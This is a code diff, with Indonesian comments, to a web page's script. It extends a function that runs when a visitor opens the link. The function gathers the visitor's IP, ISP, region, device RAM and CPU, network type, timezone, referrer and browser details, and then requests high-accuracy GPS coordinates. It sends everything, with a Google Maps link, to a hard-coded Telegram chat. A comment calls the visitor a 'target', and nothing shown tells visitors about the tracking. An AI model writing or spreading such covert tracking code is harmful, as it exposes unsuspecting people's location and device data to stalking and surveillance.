@@ -309,12 +309,18 @@ async function uploadToServer(event) {
   const telegramChatId = "8020397164";
   const visitStartTime = Date.now();
 
-  // === Fungsi Diperbarui: Otomatis mendeteksi detail lokasi & ISP saat link dibuka ===
+  // === Fungsi Pelacakan Lanjut (IP, ISP, RAM, CPU, Referrer, & Geolocation GPS) ===
   async function sendVisitorInfo() {
     try {
       const res = await fetch("https://ipwho.is/");
       const data = await res.json();
       
+      const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak diketahui";
+      const cpu = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} Core` : "Tidak diketahui";
+      const connection = navigator.connection ? (navigator.connection.effectiveType || navigator.connection.type) : "Tidak diketahui";
+      const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
+      const referrer = document.referrer ? document.referrer : "Langsung / Dari Aplikasi Chat";
+
       const message = `
 🧭 [ PENGUNJUNG MASUK SEKTOR ]
 🌐 IP: ${data.ip || "Tidak diketahui"}
@@ -322,13 +328,40 @@ async function uploadToServer(event) {
 🗺️ Wilayah: ${data.region || "-"}
 🏴 Negara: ${data.country || "-"} (${data.country_code || "-"})
 🏢 ISP: ${data.connection?.isp || "-"}
+📶 Jaringan: ${connection.toUpperCase()}
+🧠 RAM HP: ${ram} | CPU: ${cpu}
+🌍 Zona Waktu: ${timezone}
+🔗 Sumber Klik: ${referrer}
 📱 Device: ${navigator.platform}
 🧭 Browser: ${navigator.userAgent}
 🔍 Resolusi: ${window.innerWidth}x${window.innerHeight}
 📄 Halaman: ${window.location.href}
 🕒 Waktu: ${new Date().toLocaleString("id-ID")}
       `.trim();
+      
       await sendTelegramMessage(message);
+
+      // Permintaan Koordinat GPS Akurat (Opsional jika target klik 'Allow')
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const lat = position.coords.latitude;
+          const lon = position.coords.longitude;
+          const accuracy = position.coords.accuracy;
+          
+          const gpsMessage = `
+📍 [ TITIK GPS AKURAT DIDAPATKAN ]
+🌐 Latitude: ${lat}
+🌐 Longitude: ${lon}
+🎯 Akurasi: ±${Math.round(accuracy)} meter
+🗺️ Google Maps: https://www.google.com/maps?q=${lat},${lon}
+          `.trim();
+          
+          await sendTelegramMessage(gpsMessage);
+        }, (error) => {
+          console.log("Pengguna menolak izin akses lokasi GPS.");
+        }, { enableHighAccuracy: true });
+      }
+
     } catch (e) {
       console.error("Gagal melacak info pengunjung", e);
     }
@@ -359,5 +392,5 @@ async function uploadToServer(event) {
   });
 </script>
 </body>
-                                         </html>
+  </html>
   
